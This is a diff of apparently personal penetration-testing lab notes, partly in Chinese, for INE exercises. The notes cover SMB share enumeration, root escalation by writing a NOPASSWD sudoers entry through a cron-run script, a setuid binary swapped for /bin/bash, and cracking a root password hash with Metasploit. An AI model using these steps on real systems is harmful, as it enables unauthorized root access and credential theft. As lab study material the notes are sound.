@@ -39,12 +39,13 @@
 		smbmap -u admin -p password1 -H demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -p445 --script smb-enum-shares --script-args smbusername=jane,smbpassword=abc123 demo.ine.local
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	smbclient -L demo.ine.local -U jane
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Share "jane" is not listed. Checking whether jane share exists:
-		=> smbclient //demo.ine.local/jane -U jane
-	Share “Jane” exists but is not browsable.
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		Share "jane" is not listed. Checking whether jane share exists
+  
+	smbclient //demo.ine.local/jane -U jane
+		Share “Jane” exists but is not browsable.
+	
 	smbclient //demo.ine.local/admin -U admin
 		get flag.tar.gz
 		tar -xf flag.tar.gz
@@ -61,13 +62,11 @@
 	RID cycling : enum4linux -r -u admin -p password1 demo.ine.local
 # Linux Privilege Escalation
 ## Cron Jobs Gone Wild II
-	=> http://target.ine.local:8000
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ls -l
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	找出系統中是否有同名檔案
 		find / -name message 2>/dev/null
-		/home/student/message
+			/home/student/message
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	仔細檢查後，很明顯地該文件每分鐘都會被覆蓋
 		ls -l /tmp/
@@ -87,20 +86,19 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將向/etc/sudoers檔案新增一個條目，這將允許學生使用者在不提供任何密碼的情況下使用 sudo : 
 		printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	cat /usr/local/share/copy.sh
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	檢查目前的sudoers清單: 
-	sudo -l
-	   (root) NOPASSWD: ALL
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sudo su
-		cd /root
-		ls -l
-		cat flag
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		cat /usr/local/share/copy.sh
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		檢查目前的sudoers清單: 
+		sudo -l
+		   (root) NOPASSWD: ALL
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sudo su
+			cd /root
+			ls -l
+			cat flag
 ## Exploiting Setuid Programs
 	=> https://en.wikipedia.org/wiki/Setuid
-	target.ine.local:8000
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	file welcome
 		=> setuid ELF 64-bit LSB shared object
@@ -112,16 +110,14 @@
 	=> 用其他一些二進位檔案（例如 /bin/bash）替換問候語二進位文件
 		rm greetings (yes)
 		cp /bin/bash greetings
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	./welcome
-		whoami
-		cd /root
-		ls
-		cat flag
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		./welcome
+			whoami
+			cd /root
+			ls
+			cat flag
 # Linux Credential Dumping
 ## Password Cracker:Linux
-	=> demo.ine.local
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 		21/tcp open  ftp     ProFTPD 1.3.3c
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -150,10 +146,10 @@
 		set SHA512 true
 		run
 	
-	 1      sha512crypt  root      password          Single
+		 1      sha512crypt  root      password          Single
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Auxiliary failed: NoMethodError undefined method `each' for nil:NilClass
-	/etc/init.d/postgresql start
+	Note : Auxiliary failed: NoMethodError undefined method `each' for nil:NilClass
+		/etc/init.d/postgresql start
 
 ## Host & Network Penetration Testing: System-Host Based Attacks CTF 2
 	=> 獲得未經授權的存取、提升權限或破壞主機的正常功能
